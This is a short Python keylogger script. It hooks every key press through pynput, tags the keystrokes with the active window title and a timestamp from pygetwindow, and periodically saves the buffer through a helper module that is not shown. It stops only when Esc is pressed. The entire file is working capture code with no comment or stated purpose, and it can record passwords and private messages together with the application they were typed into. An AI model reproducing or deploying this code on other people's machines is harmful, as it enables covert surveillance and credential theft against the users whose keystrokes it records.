from pynput import keyboard
import pygetwindow as gw
import utils.func as f

prevWindow = ''
future = f.futureTime(1,'int')
memory = ""

def onPress(key):
    global prevWindow, future, memory
    current = gw.getActiveWindow()
    check = f.checkFlag(future)
    if prevWindow != current:
        print(f"{current} :: {f.currentTime()} ::")
        memory += f"{current} :: {f.currentTime()} ::\n"
        try:
            print(f"{key.char}")
            memory+=f"{key.char}\n"
        except AttributeError:
            print(f"{key}")
            memory+=f"{key}\n"
        prevWindow = current
    else:
        try:
            print(f"{key.char}")
            memory+=f"{key.char}\n"
        except AttributeError:
            print(f"{key}")
            memory+=f"{key}\n"
            
    if check:
        f.save(memory)
        future = f.futureTime(1,'int')
        memory = ""
        
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=onPress) as listener:
    listener.join()